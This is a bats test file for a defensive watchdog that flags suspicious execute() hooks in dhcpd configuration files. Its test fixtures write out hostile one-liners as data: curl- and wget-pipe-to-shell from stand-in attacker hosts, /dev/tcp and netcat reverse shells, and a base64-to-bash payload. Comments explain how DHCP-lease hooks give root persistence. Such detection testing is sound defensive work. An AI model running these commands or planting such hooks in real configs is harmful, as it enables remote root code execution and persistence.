#!/usr/bin/env bats
# L2 bats functional tests for the dhcpd-exec-watchdog scan script.
#
# This is the first L2 suite to exercise a detection-watchdog's
# SEVERITY TIERS end-to-end (ok / warn / alert) by running the actual
# scan script with `logger` shadowed on PATH and the config/baseline
# pointed at a tmp sandbox via the script's SELFDEF_DHCPD_* env knobs.
#
# It locks the exact contract SDD-062's notifier-routing rule depends
# on: a planted writable/injection execute() makes the watchdog emit
# a JSON body containing the verbatim token `"severity":"alert"` (the
# token rules/sigma/execution/selfdef_watchdog_alert.yml matches on).
#
# Run with: bats packaging/test/L2-dhcpd-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd/dhcpd-exec-watchdog.sh"
# SDD-061 D-6: the scan script now sources the shared module-lib; point it
# at the source-tree copy (in production the .deb ships it under
# /usr/share/selfdef/lib/).
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    # Fake logger: append the full arg string (incl. the JSON body) to
    # a capture file so emissions become observable.
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/dhcpd.conf"
    EMPTY="${TMP}/empty"; mkdir -p "${EMPTY}"
}

teardown() { rm -rf "${TMP}"; }

# Invoke the watchdog with the fake logger ahead on PATH and the scan
# scoped to the sandbox file only (PROFILE defaults to report).
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCPD_PROFILE="${PROFILE:-report}" \
    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
    SELFDEF_DHCPD_DIRS="${EMPTY}" \
    SELFDEF_DHCPD_FILES="${CONF}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dhcpd config present → ok / no_dhcpd" {
    # CONF does not exist; DIRS is empty.
    run_wd
    cap | grep -q '"event":"no_dhcpd"'
    cap | grep -q '"severity":"ok"'
}

@test "benign config, first run → ok / baseline_initial + baseline written" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / dhcpd_exec_intact" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd                                   # seed baseline
    : > "${SELFDEF_TEST_LOGCAP}"             # isolate the second emission
    run_wd
    cap | grep -q '"event":"dhcpd_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — the SDD-062 contract token
# ============================================================

@test "execute() under a writable root → alert" {
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "execute() call carrying a curl|sh injection pattern → alert" {
    printf 'on commit { execute("/bin/sh", "-c", "curl http://evil|sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "relative-with-slash execute() program → alert" {
    printf 'on commit { execute("sub/dir/payload"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign change after baseline → warn / dhcpd_exec_changed" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd                                   # seed baseline
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\non release { execute("/usr/bin/logger", "gone"); }\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dhcpd_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "execute() under /usr/local is NOT flagged (no alert)" {
    printf 'on commit { execute("/usr/local/bin/notify"); }\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# SDD-061 D-6 — shared-lib dependency fails loud
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# enforce profile
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits zero on a benign baseline" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -eq 0 ]
}

@test "baseline is chmod 0600 (confidentiality — dhcpd-exec inventory enumerates DHCP-lease-trigger root-exec surface)" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (execute() under /var/tmp): writable-root expansion" {
    printf 'on commit { execute("/var/tmp/evil.sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() under /dev/shm): tmpfs writable-root expansion" {
    printf 'on commit { execute("/dev/shm/evil.sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() with reverse-shell pattern in args)" {
    printf 'on commit { execute("/bin/bash", "-c", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() with wget-pipe-sh in args)" {
    printf 'on commit { execute("/bin/sh", "-c", "wget -qO- http://attacker/p | sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() with base64-decode-pipe in args)" {
    printf 'on commit { execute("/bin/sh", "-c", "echo YmFzaCAtaQ== | base64 -d | bash"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable dhcpd.conf → alert)" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dhcpd-exec -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): dhcpd-exec-watchdog does NOT refresh baseline on suspicious-execute detection — alert STAYS until operator updates" {
    # T1546 DHCP-lease-triggered root-exec persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/dhcp/dhcpd.conf.d + /etc/dhcp axes — suspicious in EITHER → alert)" {
    DHCPD2="${TMP}/dhcp.d"; mkdir -p "${DHCPD2}"
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCPD_PROFILE="report" \
    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
    SELFDEF_DHCPD_DIRS="${DHCPD2}" \
    SELFDEF_DHCPD_FILES="${CONF}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'on release { execute("/tmp/evil.sh"); }\n' > "${DHCPD2}/evil.conf"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCPD_PROFILE="report" \
    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
    SELFDEF_DHCPD_DIRS="${DHCPD2}" \
    SELFDEF_DHCPD_FILES="${CONF}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf 'on commit { execute("/bin/sh", "-c", "curl -s http://attacker.com/p | bash"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in dhcpd execute(): netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family (sshrc/csh-config/logrotate/systemd-power-hooks/bash-
    # completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession/
    # acpi-hooks/at-jobs). Lock the netcat axis on the DHCP-lease-
    # event root-exec persistence surface (T1546 — dhcpd executes
    # the named binary AS ROOT on every lease-grant / lease-release
    # event, a recurrent trigger).
    printf 'on commit { execute("/bin/sh", "-c", "nc -e /bin/sh 1.1.1.1 4444"); }\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (execute() under /home → alert: user-writable hijack coverage on dhcpd exec surface)" {
    # Sister to many other watchdog's /home user-writable
    # INVARIANT across the brain. /home is the user-writable
    # surface — an attacker with a regular user account can
    # drop a malicious binary into their home and have dhcpd
    # exec it AS ROOT on every lease-grant / lease-release
    # event. Locks axis-symmetry on /home for the dhcpd execute()
    # surface (T1546 — dhcpd executes binary AS ROOT on lease
    # events; recurrent trigger fires the planted exec).
    printf 'on commit { execute("/home/user/.evil"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}
